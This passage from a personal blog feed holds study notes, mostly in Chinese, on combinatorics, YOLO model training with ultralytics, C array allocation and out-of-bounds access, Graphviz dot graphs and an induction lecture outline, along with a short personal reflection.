JQKA”都可以是同花顺，所以同花情况下，应该是10个情况而不是9个情况。</p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-39-24.png" alt></p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-41-30.png" alt></p><h2 id="“Balls-in-boxes”"><a href="#“Balls-in-boxes”" class="headerlink" title="“Balls in boxes”"></a>“Balls in boxes”</h2><p>Have n “distinguishable” boxes.</p><p>Have k balls which are either:</p><ol><li>Indistinguishable</li><li>Distinguishable</li></ol><p>How many ways to place balls in boxes with</p><ol><li>At most one</li><li>Any number of<br>balls per box</li></ol><p>Take Notice</p><p>Suppose K is a set with $∣K∣ = k$ and N is a set with $∣N∣ = n$:</p><ul><li>2A counts the number of injective functions from K to N</li><li>2B counts the number of functions from K to N</li></ul><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-43-40.png" alt></p><h1 id="Alternative-Techniques"><a href="#Alternative-Techniques" class="headerlink" title="Alternative Techniques"></a>Alternative Techniques</h1><p>What if the current techniques are unwieldy?<br>Other techniques for obtaining an exact count:</p><ul><li>Find a different approach for counting</li><li>Make use of symmetries</li><li>Make use of recursion</li><li>Write a program (running time?)</li></ul><h2 id="Example-5"><a href="#Example-5" class="headerlink" title="Example"></a>Example</h2><p>How many sequences of 15 coin flips have an even number of heads?</p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-45-22.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-45-37.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-45-51.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-46-06.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-46-14.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-46-28.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-46-39.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-47-00.png" alt></p><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-47-06.png" alt></p><h1 id="Difficult-Counting-Problems-not-assessed"><a href="#Difficult-Counting-Problems-not-assessed" class="headerlink" title="Difficult Counting Problems (not assessed)"></a>Difficult Counting Problems (not assessed)</h1><h2 id="Using-Programs-to-Count"><a href="#Using-Programs-to-Count" class="headerlink" title="Using Programs to Count"></a>Using Programs to Count</h2><p>Two dice, a red die and a black die, are rolled.<br>(Note: one die, two or more dice)</p><p>Write a program to list all the pairs {(R,B) ∶ R &gt; B}</p><p>Similarly, for three dice, list all triples R &gt; B &gt; G</p><p>Generally, for n dice, all of which are m-sided (n ≤ m), list all decreasing n-tuples</p><p>Take Notice</p><p>In order to just find the number of such n-tuples, it is not<br>necessary to list them all. One can write a recurrence relation for<br>these numbers and compute (or try to solve) it.</p><h2 id="Approximate-Counting"><a href="#Approximate-Counting" class="headerlink" title="Approximate Counting"></a>Approximate Counting</h2><p><img src="/2024/11/18/Math/Combinatorics/2024-11-18-14-48-34.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yolo_trainning</title>
      <link href="/2024/11/15/Python/yolo-trainning/"/>
      <url>/2024/11/15/Python/yolo-trainning/</url>
      
        <content type="html"><![CDATA[<p>Among 3rd and 5th, November, I helped others to research YOLO to distinguish pictures.</p><p>It’s a little hurry, so I pasted my original note here, please translate into English manually.</p><ul><li><a href="#环境准备">环境准备</a></li><li><a href="#分割模型知识">分割模型知识</a></li><li><a href="#yolo命令行">yolo命令行</a><ul><li><a href="#train">Train</a></li><li><a href="#predict">Predict</a></li><li><a href="#val">Val</a></li><li><a href="#export">Export</a></li><li><a href="#special">Special</a></li></ul></li><li><a href="#py代码">Py代码</a><ul><li><a href="#完成命令行的事儿">完成命令行的事儿</a></li></ul></li><li><a href="#训练数据和打标">训练数据和打标</a></li><li><a href="#结论">结论</a></li><li><a href="#数据格式化处理">数据格式化处理</a><ul><li><a href="#1坑图片全黑">1.坑：图片全黑</a></li><li><a href="#2坑重复连续">2.坑：重复连续</a></li><li><a href="#使用coco进行解码rle-mask解码正确">使用coco进行解码，rle->mask解码正确。</a></li></ul></li><li><a href="#训练">训练</a></li></ul><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code>git clone https://github.com/ultralytics/ultralytics.git</code></pre><p>cd 进入</p><pre><code>conda create -n py12 python=3.12</code></pre><p>然后会看到解释器（conda\envs路径下）</p><pre><code>E:\anaconda3\envs\py12\python.exe</code></pre><p>复制到ultralytics目录下</p><p>pycharm添加python解释器 py12, 然后创建venv的库目录</p><p>  pip3 install torch torchvision torchaudio</p><h1 id="ultralytics-py12-python-exe-m-pip-install"><a href="#ultralytics-py12-python-exe-m-pip-install" class="headerlink" title="(ultralytics) .\py12\python.exe -m pip install ."></a>(ultralytics) .\py12\python.exe -m pip install .</h1><p>成功运行</p><pre><code>&gt;&gt;&gt; from ultralytics import YOLOCreating new Ultralytics Settings v0.0.6 file ✅View Ultralytics Settings with &#39;yolo settings&#39; or at &#39;C:\Users\ranja\AppData\Roaming\Ultralytics\settings.json&#39;Update Settings with &#39;yolo settings key=value&#39;, i.e. &#39;yolo settings runs_dir=path/to/dir&#39;. For help see https://docs.ultralytics.com/quickstart/#ultralytics-setti&gt;&gt;&gt;</code></pre><h1 id="分割模型知识"><a href="#分割模型知识" class="headerlink" title="分割模型知识"></a>分割模型知识</h1><p>yolo的识别之你说的coco8的那80多个物品类别，但是我要具体识别其中几个，我自己定义个coco8，这是yolo的coco8的子集</p><p>yolo11n.pt与yolo11n-seg.pt区别：</p><p>一个只是框框，另一个会抠图</p><h1 id="yolo命令行"><a href="#yolo命令行" class="headerlink" title="yolo命令行"></a>yolo命令行</h1><pre><code>Ultralytics yolo commands use the following syntax:</code></pre><p><strong>yolo TASK MODE ARGS</strong></p><p>TASK (optional) is one of (detect, segment, classify, pose, obb)</p><p>MODE (required) is one of (train, val, predict, export, track, benchmark)</p><p>ARGS (optional) are arg=value pairs like imgsz=640 that override defaults.</p><p>See all ARGS in the full Configuration Guide or with the yolo cfg CLI command.</p><h2 id="Train"><a href="#Train" class="headerlink" title="Train"></a>Train</h2><p>Train a detection model for 10 epochs with an initial learning_rate of 0.01</p><pre><code>yolo train data=coco8.yaml model=yolo11n.pt epochs=10 lr0=0.01</code></pre><p>epochs是训练轮数，过度训练会导致在训练数据的过于拟合，在训练数据上表现良好，但是测试数据上表现不好</p><p>lr是学习率</p><ul><li>过高的学习率：可能导致训练不稳定，甚至无法收敛（即模型无法达到理想的准确率）。</li><li>过低的学习率：可能导致训练速度太慢，或者在局部最优解徘徊。</li></ul><h2 id="Predict"><a href="#Predict" class="headerlink" title="Predict"></a>Predict</h2><p>Predict a YouTube video using a pretrained segmentation model at image size 320:</p><pre><code>yolo predict model=yolo11n-seg.pt source=&#39;https://youtu.be/LNwODJXcvt4&#39; imgsz=320</code></pre><p>会从官网下载那个pt文件，会解析那个youtube视频流</p><p><a href="https://github.com/ultralytics/yolov5/releases/download/v{version}/{model}.pt">https://github.com/ultralytics/yolov5/releases/download/v{version}/{model}.pt</a></p><p><a href="https://github.com/ultralytics/yolov5/releases/download/v7.0/yolov5s.pt">https://github.com/ultralytics/yolov5/releases/download/v7.0/yolov5s.pt</a></p><p>如果自定义pt，可以直接指定路径</p><pre><code>model=&#39;/path/to/your_custom_model.pt&#39;</code></pre><h2 id="Val"><a href="#Val" class="headerlink" title="Val"></a>Val</h2><p>Val a pretrained detection model at batch-size 1 and image size 640:</p><p>验证集是一个独立于训练集的数据子集，用于测试模型在未见数据上的表现。通过对验证集进行评估，可以获取模型的准确性、召回率、F1-score 和 mAP（mean Average Precision）等指标。</p><p>yolo val model=yolo11n.pt data=coco8.yaml batch=1 imgsz=640</p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-19-40.png" alt></p><h2 id="Export"><a href="#Export" class="headerlink" title="Export"></a>Export</h2><p>Export a yolo11n classification model to ONNX format at image size 224 by 128 (no TASK required)</p><pre><code>yolo export model=yolo11n-cls.pt format=onnx imgsz=224,128</code></pre><p>导出模型</p><p><strong>format=onnx</strong>：这表明导出的格式是 ONNX（Open Neural Network Exchange），这是一种开放的深度学习模型格式，用于在不同的框架和平台之间共享和使用模型。<br><strong>imgsz=224,128</strong>：指定输入图像的尺寸为 224 像素（宽）和 128 像素（高）。这意味着在导出时，模型会调整其输入层的大小，以适应这一特定的图像尺寸。此参数确保当您使用导出的模型时，输入图像的尺寸符合要求。</p><h2 id="Special"><a href="#Special" class="headerlink" title="Special"></a>Special</h2><p>Run special commands to see version, view settings, run checks and more:</p><pre><code>yolo helpyolo checksyolo versionyolo settingsyolo copy-cfgyolo cfg</code></pre><h1 id="Py代码"><a href="#Py代码" class="headerlink" title="Py代码"></a>Py代码</h1><h2 id="完成命令行的事儿"><a href="#完成命令行的事儿" class="headerlink" title="完成命令行的事儿"></a>完成命令行的事儿</h2><pre><code>from ultralytics import YOLO# Create a new YOLO model from scratchmodel = YOLO(&quot;yolo11n.yaml&quot;)# Load a pretrained YOLO model (recommended for training)model = YOLO(&quot;yolo11n.pt&quot;)# Train the model using the &#39;coco8.yaml&#39; dataset for 3 epochsresults = model.train(data=&quot;coco8.yaml&quot;, epochs=3)# Evaluate the model&#39;s performance on the validation setresults = model.val()# Perform object detection on an image using the modelresults = model(&quot;https://ultralytics.com/images/bus.jpg&quot;)# Export the model to ONNX formatsuccess = model.export(format=&quot;onnx&quot;)</code></pre><h1 id="训练数据和打标"><a href="#训练数据和打标" class="headerlink" title="训练数据和打标"></a>训练数据和打标</h1><p><a href="https://github.com/Incalos/YOLO-Datasets-And-Training-Methods/blob/master/README_CN.md">https://github.com/Incalos/YOLO-Datasets-And-Training-Methods/blob/master/README_CN.md</a></p><pre><code>pip install labelimglabelimg</code></pre><p>命令直接启动labelimg</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><pre><code>https://www.kaggle.com/code/creazyeeeeli/acsnansck#Traininghttps://docs.ultralytics.com/models/yolov8/#performance-metrics</code></pre><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-22-21.png" alt></p><h1 id="数据格式化处理"><a href="#数据格式化处理" class="headerlink" title="数据格式化处理"></a>数据格式化处理</h1><p>RLE转mask</p><p>最开始看着那个RLE数据，是奇数个，而非偶数个，最开始以为RLE出错了。<br>后来李顺想到，可能是“前景，背景，前景，背景。。。”这样交替下来的像素</p><p>然后我觉得应该是对的，于是写了个脚本：<br>一个图片对应多个segments，因此每个segment都是一个掩码图片，最终我把这些掩码图片叠加起来得到最终掩码图片。</p><h2 id="1-坑：图片全黑"><a href="#1-坑：图片全黑" class="headerlink" title="1.坑：图片全黑"></a>1.坑：图片全黑</h2><p>最开始我处理掩码，一维转二维，都只用0，1表示，然后保存成图片，但是最终所有图片全黑。我百思不得其解，但是最终发现原来单通道图片是一个字节表示一个像素，是0-255，有灰阶的，不是单纯的非黑即白。因此我直接令np.array矩阵点乘255，得到图片。</p><h2 id="2-坑：重复连续"><a href="#2-坑：重复连续" class="headerlink" title="2.坑：重复连续"></a>2.坑：重复连续</h2><p>应该是我们自己写的rle数据转mask存在问题，我们写的不对，导致其看起来像高中学的正选波形一样在图片上重复。</p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-02.png" alt></p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-10.png" alt></p><h2 id="使用coco进行解码，rle-gt-mask解码正确。"><a href="#使用coco进行解码，rle-gt-mask解码正确。" class="headerlink" title="使用coco进行解码，rle-&gt;mask解码正确。"></a>使用coco进行解码，rle-&gt;mask解码正确。</h2><p>后来顺哥意识到，应该有其他库能进行解码，然后找到了coco去进行解码，正确。</p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-39.png" alt></p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-50.png" alt></p><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-23-58.png" alt></p><h1 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h1><p><img src="/2024/11/15/Python/yolo-trainning/2024-11-15-07-24-11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Py </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>感悟</title>
      <link href="/2024/11/03/trivia/Insights/"/>
      <url>/2024/11/03/trivia/Insights/</url>
      
        <content type="html"><![CDATA[<p>来海外留学，已是开工没有回头箭：不得不发，继而开弓没回头箭，自我形成一个没有底洞的PUA深渊。虽然近似倾我毕生全力以赴，认真程度甚于我国。学海无边，书囊无底。人蠢，就多努力；人冒失，就多踩坑多总结经验；缺什么资源，自己动手段去争取；比人弱，就多向人家学习；怕糊涂，就多睡觉保证脑袋清醒；想获得什么东西或本领，就去争去想去抢去做。宁愿选择咬牙切齿的让自己投入，也比连续几天苦大仇深怨天尤人要好得多;宁愿被别人说尖锐沉默好强，也比被别人当成真正的煞笔无趣的忽视要强的多。既然有了上台的机会，就没必要诉苦或抱怨资源，天赋，机会，运气不如谁谁，也没必要埋怨遇到什么杂七杂八的挫折。别人嘲讽，讥笑，赞扬，和我没有任何关系，眼中只有尊重自己，挑战自己，取悦自己，拾掇拾掇这狼狈的样子继续出发，继续前进。犯的错，丢的分，失去的东西，经历的事故，失去了就失去了，再花点时间和功夫骂自己，多指摘，我自己的各种愚蠢，自大，和心态爆炸。愿下次再遇到乱七八糟的事故，挫折，再多多心态平和的指摘自己。</p>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Declaring arrays and out of bounds</title>
      <link href="/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/"/>
      <url>/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#声明数组方式">声明数组方式</a><ul><li><a href="#格式化字符串典型静态数组">格式化字符串（典型静态数组）</a></li><li><a href="#动态内存分配">动态内存分配</a></li><li><a href="#动态分配内存追加数组长度realloc">动态分配内存，追加数组长度：realloc</a></li><li><a href="#两种方式比较">两种方式比较</a><ul><li><a href="#静态数组">静态数组</a><ul><li><a href="#优点">优点</a></li><li><a href="#缺点">缺点</a></li></ul></li><li><a href="#动态内存分配如-malloc">动态内存分配（如 malloc）</a><ul><li><a href="#优点-1">优点</a></li><li><a href="#缺点-1">缺点：</a></li></ul></li></ul></li><li><a href="#关于越界操作越界赋值和访问">关于越界操作：越界赋值和访问</a></li><li><a href="#数组默认值">数组默认值</a></li></ul></li><li><a href="#数组指针及访问方式">数组指针及访问方式</a><ul><li><a href="#字符指针字符串首地址即字符串本身">字符指针（字符串首地址(即字符串本身)）</a><ul><li><a href="#如多名字数组赋值">如多名字数组赋值</a></li></ul></li><li><a href="#结构体的成员变量是一个指针但是可以直接malloc多个当作数组使用">结构体的成员变量是一个指针，但是可以直接malloc多个当作数组使用</a></li></ul></li></ul><h1 id="声明数组方式"><a href="#声明数组方式" class="headerlink" title="声明数组方式"></a>声明数组方式</h1><h2 id="格式化字符串（典型静态数组）"><a href="#格式化字符串（典型静态数组）" class="headerlink" title="格式化字符串（典型静态数组）"></a>格式化字符串（典型静态数组）</h2><pre><code>char command[(FILE_NAME_LEN+1)*4] = &#123;0&#125;;# 全部值会变为 ‘\0’</code></pre><pre><code>snprintf(command, FILE_NAME_LEN*4, &quot;dot -T png %s -o %s&quot;, dotFileName, pngFileName);# 格式化字符串复制</code></pre><p>如果<strong>超过最大长度</strong>，如<code>FILE_NAME_LEN*4</code>，函数为了避免缓冲区溢出问题，会自动截断字符串，保证安全。</p><pre><code># graph node name 赋值void GraphAddNode(struct Graph *pGraph, long u, char *name) &#123;    if (IsLegalNodeNum(pGraph, u)) &#123;                snprintf(pGraph-&gt;pNodes[u].name, MAX_ID_LEN, &quot;%s&quot;, name);    &#125;&#125;</code></pre><h2 id="动态内存分配"><a href="#动态内存分配" class="headerlink" title="动态内存分配"></a>动态内存分配</h2><p>（如 malloc）malloc( xx, sizeof(xx) <em> 1000) memset(0, sizeof(xxx)</em>1000)</p><pre><code>Type *xx = (Type *)malloc(sizeof(Type) * 1000);memset(xx, 0, sizeof(Type) * 1000);</code></pre><h2 id="动态分配内存，追加数组长度：realloc"><a href="#动态分配内存，追加数组长度：realloc" class="headerlink" title="动态分配内存，追加数组长度：realloc"></a>动态分配内存，追加数组长度：realloc</h2><p>realloc 函数<strong>通常</strong>会<strong>返回与传递给它的指针相同的地址</strong>，但这并<strong>不是保证</strong>。</p><p>如果原来的内存无法扩展（例如，如果没有足够的连续内存），realloc 会分配一块<strong>新的内存</strong>，并<strong>将原始数据复制到这块新内存</strong>中。在这种情况下，原来的数据也会被保留（只要 realloc 成功），并且可以通过新的指针访问。<strong>因此不需要考虑手动复制先前数据到新地址的过程</strong>。</p><pre><code>// 扩展数组int *new_array = realloc(array, 10 * sizeof(int)); // 试图扩展到 10 个 intif (new_array == NULL) &#123;    fprintf(stderr, &quot;Memory reallocation failed\n&quot;);    free(array); // 如果 realloc 失败，释放原始内存    return 1;&#125;array = new_array; // 更新指针// 初始化新分配的元素 for (int i = 5; i &lt; 10; i++) &#123; array[i] = i + 1; // 赋值 6, 7, 8, 9, 10 &#125;</code></pre><h2 id="两种方式比较"><a href="#两种方式比较" class="headerlink" title="两种方式比较"></a>两种方式比较</h2><h3 id="静态数组"><a href="#静态数组" class="headerlink" title="静态数组"></a>静态数组</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>简单性：定义和使用非常简单，直接分配内存并在<strong>栈</strong>上管理，易于理解。<br>语法清晰，直接通过数组名和索引访问元素。</p><p>自动内存管理：静态数组在栈上分配，自动管理内存的分配和释放。当超出作用域时，内存会自动释放，减少了内存泄漏的风险。</p><p>速度：在栈上分配内存通常比在堆上分配更快，因为栈的内存分配和释放是通过指针的移动实现的。</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>大小限制：<strong>数组的大小必须在编译时确定，不能动态调整</strong>。如果需要更大的数组，需要手动修改代码和重新编译。</p><p><strong>栈内存有限，大型数组可能导致栈溢出（stack overflow）</strong>。</p><p>灵活性差：对于需要根据运行时条件变化的数组，静态数组不够灵活。</p><h3 id="动态内存分配（如-malloc）"><a href="#动态内存分配（如-malloc）" class="headerlink" title="动态内存分配（如 malloc）"></a>动态内存分配（如 malloc）</h3><h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><p>灵活性：<strong>可以在运行时决定数组的大小，适合处理不确定大小的数据</strong>。可以根据需求动态扩展数组大小。</p><p>内存管理：<strong>在堆上分配的内存可以容纳比栈更多的数据，适合大数据量的存储</strong>。</p><p>共享数据：可以<strong>通过指针共享动态分配的内存，允许多个函数访问同一内存块</strong>。</p><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><p>复杂性：动态内存管理需要<strong>显式调用 malloc、free 等函数，增加了编程复杂性</strong>。<br><strong>需要手动管理内存，容易引入内存泄漏（未释放的内存）或悬空指针（指向已释放内存的指针）</strong>。</p><p>性能开销：动态分配内存的性能通常低于栈上的分配，因为堆内存管理涉及更多的操作和可能的碎片化。<strong>每次调用 malloc 都有可能影响性能，特别是在频繁分配和释放内存时</strong>。</p><p>错误处理：</p><p><strong>需要检查 malloc 返回的指针是否为 NULL，以处理内存分配失败的情况。</strong></p><h2 id="关于越界操作：越界赋值和访问"><a href="#关于越界操作：越界赋值和访问" class="headerlink" title="关于越界操作：越界赋值和访问"></a>关于越界操作：越界赋值和访问</h2><p>不推荐越界操作，因为不论是哪种分配数组方式，越界赋值或访问都会有失败的问题。</p><p>比如这里对a[6] 更多的值进行赋值</p><p><img src="/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/2024-10-30-14-18-57.png" alt></p><p>越界确实会赋值成功几个，但是那个11就失败了。赋值失败</p><p><img src="/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/2024-10-30-14-19-22.png" alt></p><p>直接访问、打印这个值也是失败的。</p><p><img src="/2024/10/30/Cpp/Declaring-arrays-and-out-of-bounds/2024-10-30-14-19-40.png" alt></p><h2 id="数组默认值"><a href="#数组默认值" class="headerlink" title="数组默认值"></a>数组默认值</h2><p>就当默认全是 ‘\0’就好理解了，{‘0’}和{0}不一样</p><p>默认全是’\0’<br>char command[(FILE_NAME_LEN + 1) <em> 4] = {0};<br>char </em>nodeNames[NUM_OF_NODES] = {NULL};</p><p>只有第一个元素是’0’<br>char *nodeNames[NUM_OF_NODES] = {‘0’};</p><p>char array[10] = {‘a’, ‘b’, ‘c’}; // 只有前3个元素被赋值，其他元素被初始化为 ‘\0’</p><h1 id="数组指针及访问方式"><a href="#数组指针及访问方式" class="headerlink" title="数组指针及访问方式"></a>数组指针及访问方式</h1><p>没有负数下标的访问方式，不如py</p><p><code>arr[-1] in C</code></p><p>访问地址</p><p><code>&amp;arr[0]</code></p><p><code>Arr+I</code> (i可以是0  如arr+i是第i个元素的地址)</p><p>访问值</p><p><code>*(arr+i)</code></p><p><code>Arr[i]</code></p><h2 id="字符指针（字符串首地址-即字符串本身-）"><a href="#字符指针（字符串首地址-即字符串本身-）" class="headerlink" title="字符指针（字符串首地址(即字符串本身)）"></a>字符指针（字符串首地址(即字符串本身)）</h2><p>字符串本身隐式的写了一个<code>char[]</code>,然后<code>char*</code>的首地址可以直接以数组形式访问。<br>数字没法办到这一点。</p><pre><code>#include &lt;stdio.h&gt;int main()&#123;    char *a = &quot;hello&quot;;    printf(&quot;%c\n&quot;, a[2]);    int b[] = &#123;1, 2, 3, 4, 5&#125;;    printf(&quot;%p\n&quot;, b);    return 0;&#125;</code></pre><p>更详细一些，<strong>双引号</strong>包裹的<strong>字符串(本质是字符数组)</strong>，返回的就是<strong>首地址（既char*）</strong></p><pre><code>char *argv[] = &#123; &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, NULL &#125;; // 这里是双引号包裹的，是字符串不是数组</code></pre><pre><code>char *cptr =&quot;CSE@UNSW&quot;;</code></pre><ul><li>argv[0] 是指向字符串 “a” 的指针（即 char*），</li><li>argv[1] 是指向字符串 “b” 的指针，</li><li>argv[2] 是指向字符串 “c” 的指针。</li></ul><h3 id="如多名字数组赋值"><a href="#如多名字数组赋值" class="headerlink" title="如多名字数组赋值"></a>如多名字数组赋值</h3><p><strong>“0”是给 char<em>的正确方式，‘0’ 给char</em> 直接报错</strong></p><pre><code>// char *nodeNames[NUM_OF_NODES] = &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;&#125;;char *nodeNames[NUM_OF_NODES] = &#123;&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;&#125;;</code></pre><h2 id="结构体的成员变量是一个指针，但是可以直接malloc多个当作数组使用"><a href="#结构体的成员变量是一个指针，但是可以直接malloc多个当作数组使用" class="headerlink" title="结构体的成员变量是一个指针，但是可以直接malloc多个当作数组使用"></a>结构体的成员变量是一个指针，但是可以直接malloc多个当作数组使用</h2><pre><code>typedef long AdjMatrixElementTy;struct Graph&#123;AdjMatrixElementTy *pAdjMatrix;&#125;pGraph-&gt;pAdjMatrix = (AdjMatrixElementTy *) malloc(sizeof(AdjMatrixElementTy) * n * n);memset(pGraph-&gt;pAdjMatrix, 0, sizeof(AdjMatrixElementTy) * n * n);</code></pre>]]></content>
      
      
      <categories>
          
          <category> C-Cpp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>prove floor&#39;s floor</title>
      <link href="/2024/10/28/Math/prove-floor-s-floor/"/>
      <url>/2024/10/28/Math/prove-floor-s-floor/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/10/28/Math/prove-floor-s-floor/r_2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Dijkstra</title>
      <link href="/2024/10/27/Algorithm/Dijkstra/"/>
      <url>/2024/10/27/Algorithm/Dijkstra/</url>
      
        <content type="html"><![CDATA[<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://zh.wikipedia.org/zh-cn/%E6%88%B4%E5%85%8B%E6%96%AF%E7%89%B9%E6%8B%89%E7%AE%97%E6%B3%95">wiki Dijkstra (Chinese)</a></p><p><a href="https://www.bilibili.com/video/BV1uT4y1p7Jy">bilibili Dijkstra demon</a></p><p><a href="https://www.bilibili.com/video/BV1jE411W7tT">bilibili Dijkstra demon 2</a></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>dot and graph</title>
      <link href="/2024/10/27/Algorithm/dot-and-graph/"/>
      <url>/2024/10/27/Algorithm/dot-and-graph/</url>
      
        <content type="html"><![CDATA[<h1 id="graphviz"><a href="#graphviz" class="headerlink" title="graphviz"></a>graphviz</h1><p><a href="https://graphviz.org/">Graphviz</a> is a open source visualization software. <code>dot</code> is a common command line of Graphviz suite. In COMP9024 of UNSW, we learn how to use <code>dot</code> to make directed or undirected graph.</p><h1 id="dot-filetype-undirected-and-directed-graph"><a href="#dot-filetype-undirected-and-directed-graph" class="headerlink" title="dot filetype, undirected and directed graph"></a>dot filetype, undirected and directed graph</h1><p>The .dot file format is used for defining graphs in a plain text language known as DOT language.</p><p>undirected graph:</p><pre><code>graph OurGraph &#123;    A -- B;    B -- C;    C -- A;&#125;</code></pre><p>directed graph:</p><pre><code>digraph OurDirectedGraph &#123;    A -&gt; B;    B -&gt; C;    C -&gt; A;&#125;</code></pre><p>In COMP9024, the lectures and tutors like to make the vertices redundent clarification in dot file:</p><pre><code>graph OurUndirectedGraph &#123;&quot;0&quot; -- &#123;&quot;2&quot;&#125;&quot;0&quot; -- &#123;&quot;3&quot;&#125;&quot;0&quot; -- &#123;&quot;4&quot;&#125;&quot;1&quot; -- &#123;&quot;2&quot;&#125;&quot;1&quot; -- &#123;&quot;5&quot;&#125;&quot;2&quot; -- &#123;&quot;4&quot;&#125;&quot;2&quot; -- &#123;&quot;5&quot;&#125;&quot;2&quot; -- &#123;&quot;6&quot;&#125;&quot;6&quot; -- &#123;&quot;7&quot;&#125;&quot;0&quot;&quot;1&quot;&quot;2&quot;&quot;3&quot;&quot;4&quot;&quot;5&quot;&quot;6&quot;&quot;7&quot;&#125;</code></pre><pre><code>graph OurUndirectedGraph &#123;&quot;0&quot; -- &#123;&quot;2&quot;&#125;&quot;0&quot; -- &#123;&quot;3&quot;&#125;&quot;0&quot; -- &#123;&quot;4&quot;&#125;&quot;1&quot; -- &#123;&quot;2&quot;&#125;&quot;1&quot; -- &#123;&quot;5&quot;&#125;&quot;2&quot; -- &#123;&quot;4&quot;&#125;&quot;2&quot; -- &#123;&quot;5&quot;&#125;&quot;2&quot; -- &#123;&quot;6&quot;&#125;&quot;6&quot; -- &#123;&quot;7&quot;&#125;&quot;0&quot;&quot;1&quot;&quot;2&quot;&quot;3&quot;&quot;4&quot;&quot;5&quot;&quot;6&quot;&quot;7&quot;&#125;</code></pre><h1 id="dot-command"><a href="#dot-command" class="headerlink" title="dot command"></a>dot command</h1><pre><code>dot -T png images/OurUndirectedGraph_0000.dot -o images/OurUndirectedGraph_0000.png# dot: This is the Graphviz command-line tool used to process DOT files.# -T png: Specifies the output format, in this case, PNG (portable network graphics). Graphviz supports other formats like SVG, PDF, and JPEG.# images/OurUndirectedGraph_0000.dot: This is the path to the input DOT file, which contains the graph definition.# -o images/OurUndirectedGraph_0000.png: Specifies the output file path and name for the generated image.</code></pre><h1 id="installation-on-Windows"><a href="#installation-on-Windows" class="headerlink" title="installation on Windows"></a>installation on Windows</h1><p>link: <a href="http://www.graphviz.org/download/">http://www.graphviz.org/download/</a></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Induction</title>
      <link href="/2024/10/26/Math/Induction/"/>
      <url>/2024/10/26/Math/Induction/</url>
      
        <content type="html"><![CDATA[<p>Lecture 12: Induction</p><ul><li><a href="#motivation">Motivation</a><ul><li><a href="#example">Example</a></li><li><a href="#inductive-reasoning">Inductive Reasoning</a></li><li><a href="#mathematical-induction">Mathematical Induction</a></li><li><a href="#induction-proof-structure">Induction proof structure</a></li></ul></li><li><a href="#basic-induction">Basic Induction</a><ul><li><a href="#example-1">example</a></li></ul></li><li><a href="#variations-on-basic-induction">Variations on Basic Induction</a><ul><li><a href="#induction-from-m-upwards">Induction From m Upwards</a><ul><li><a href="#example-2">Example</a></li></ul></li><li><a href="#induction-steps-ℓ--1">Induction Steps ℓ > 1</a><ul><li><a href="#example-3">example</a></li></ul></li><li><a href="#strong-induction">Strong Induction</a><ul><li><a href="#example-4">Example</a></li></ul></li><li><a href="#negative-integers-backward-induction">Negative Integers, Backward Induction</a><ul><li><a href="#idea">Idea</a></li><li><a href="#example-am-gm-inequality">Example: AM-GM Inequality</a></li></ul></li></ul></li><li><a href="#structural-induction">Structural Induction</a><ul><li><a href="#example-induction-on-σ">Example: Induction on $Σ^∗$</a></li><li><a href="#example-2-induction-on-σ">Example 2: Induction on $Σ^∗$</a></li><li><a href="#example-3-induction-on-σ">Example 3: Induction on $Σ^∗$</a></li><li><a href="#example-4-induction-on-more-complex-structures">Example 4: Induction on more 